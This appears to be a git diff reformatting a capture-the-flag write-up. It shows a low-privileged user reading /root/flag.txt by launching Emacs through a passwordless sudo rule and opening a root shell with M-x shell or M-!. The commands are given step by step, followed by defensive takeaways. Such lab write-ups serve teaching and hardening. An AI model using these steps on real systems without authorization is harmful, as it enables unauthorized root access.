@@ -1,82 +1,81 @@
+# Privilege Escalation via Sudo Misconfiguration (Emacs)
 
-CTF Write-up: Privilege Escalation via Sudo Misconfiguration (Emacs)
-🎯 Objective
+> **Platform:** Other  
+> **Category:** Privilege Escalation  
+> **Difficulty:** Easy  
+> **Solved:** Yes ✅
 
-Gain access to the flag stored in:
+---
 
-/root/flag.txt
+## 📋 Challenge Description
 
-despite being logged in as a low-privileged user (ctf-player).
+Gain access to the flag stored in `/root/flag.txt` while logged in as a low-privileged user (`ctf-player`).
 
-🔍 1. Initial Reconnaissance
+---
 
-After logging into the system via SSH, the first step was to inspect the current directory and user privileges:
+## 🔍 Reconnaissance
 
+After logging in via SSH, inspected the current user and file permissions:
+
+```bash
 whoami
 ls -l
+```
 
-Result:
+- User: `ctf-player`
+- Flag file: `-r--r----- 1 root root 31 flag.txt`
 
-User: ctf-player
-Flag file:
--r--r----- 1 root root 31 flag.txt
-🚨 Observation:
-File is owned by root
-No read permission for normal users
+The file is owned by root with no read permission for normal users — direct access is impossible.
 
-👉 Direct access to the flag is impossible.
+---
 
-🔐 2. Checking Privileges
+## 🔐 Checking Sudo Privileges
 
-The next step was to check sudo permissions:
-
+```bash
 sudo -l
+```
 
 Output:
-
 (ALL) NOPASSWD: /bin/emacs
-🚨 Key Finding:
+The user can run Emacs as root without a password — a known [GTFOBins](https://gtfobins.github.io/gtfobins/emacs/) vector.
 
-The user can execute Emacs as root without password.
+---
 
-💣 3. Privilege Escalation Vector
+## 🚀 Exploitation
 
-Emacs is a powerful editor capable of:
+Launched Emacs with root privileges:
 
-executing shell commands
-spawning subshells
-running system commands
-
-This makes it a known GTFOBins privilege escalation vector.
-
-🚀 4. Exploitation
-
-Emacs was launched with elevated privileges:
-
+```bash
 sudo /bin/emacs -nw
+```
 
-Inside Emacs, a shell was spawned:
-
+Inside Emacs, spawned a root shell using:
 M-x shell
+Verified root access:
 
-or:
-
-M-!
-
-This provided a root-level shell due to sudo execution context.
-
-🧪 5. Gaining Root Access
-
-Once inside the shell:
-
+```bash
 whoami
+# root
+```
 
-Output:
+---
 
-root
-🏁 6. Flag Retrieval
+## 🏁 Flag Retrieval
 
-With root privileges, the protected file was accessed:
-
+```bash
 cat /root/flag.txt
-🎉 Flag successfully retrieve
+```
+
+Flag successfully retrieved! 🎉
+
+---
+
+## 🧠 Key Takeaways
+
+- Always check `sudo -l` during privilege escalation — misconfigured sudo rights are a common vulnerability.
+- Editors like Emacs, Vim, and Nano can spawn shells and should never be granted sudo without restriction.
+- Reference [GTFOBins](https://gtfobins.github.io) for a full list of sudo escalation vectors.
+
+**References:**
+- [GTFOBins - Emacs](https://gtfobins.github.io/gtfobins/emacs/)
+- [HackTricks - Sudo Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo)
